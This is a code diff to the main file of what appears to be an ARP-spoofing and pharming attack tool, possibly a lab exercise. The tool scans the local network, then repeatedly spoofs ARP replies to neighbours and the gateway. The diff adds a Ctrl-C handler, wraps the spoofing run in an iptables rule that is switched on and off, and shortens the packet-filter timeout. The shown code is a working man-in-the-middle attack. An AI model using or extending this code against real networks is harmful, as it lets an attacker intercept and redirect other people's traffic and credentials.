@@ -13,6 +13,7 @@
 #include <sys/ioctl.h>
 #include <sys/socket.h>
 #include <sys/time.h>
+#include <signal.h>
 
 #include <linux/if_packet.h>
 
@@ -23,7 +24,16 @@
 #include "scan.h"
 #include "spoof.h"
 #include "filter.h"
+#include "command.h"
 #include "pharm_attack.h"
+
+std::string global_ifname;
+
+void SIGINT_handler(int sig)
+{
+    modify_iptables_rule(global_ifname, 0);
+    exit(EXIT_SUCCESS);
+}
 
 /**
  * target all the neighbors in the local network
@@ -38,7 +48,7 @@ void arp_spoofing(std::string gateway_ip,
 {
     // run for 100 iterations
     int nbytes;
-    filter_operator->set_timeout(1, 0);
+    filter_operator->set_timeout(0, 200);
 
     for (int t = 0; t < 100; t++) {
         std::cout << "spoofing iteration: " << t << std::endl;
@@ -75,8 +85,10 @@ int main()
     
     // iterate through all network interfaces
     // stops if ifname != "lo"
+    signal(SIGINT, SIGINT_handler);
     get_network_interface_info(sender_ip, netmask, sender_mac, ifname);
     gateway_ip = get_gateway(ifname);
+    global_ifname = ifname;
 
     std::vector<std::string> candidates;
     std::vector<std::pair<std::string, std::string>> answered_list;
@@ -153,7 +165,9 @@ int main()
     arp_operator.prepare_unicast();
     arp_operator.prepare_header_values();
 
+    modify_iptables_rule(ifname, 1);
     arp_spoofing(gateway_ip, answered_list, &spoof_operator, &filter_operator);
+    modify_iptables_rule(ifname, 0);
 
     return 0;
 }
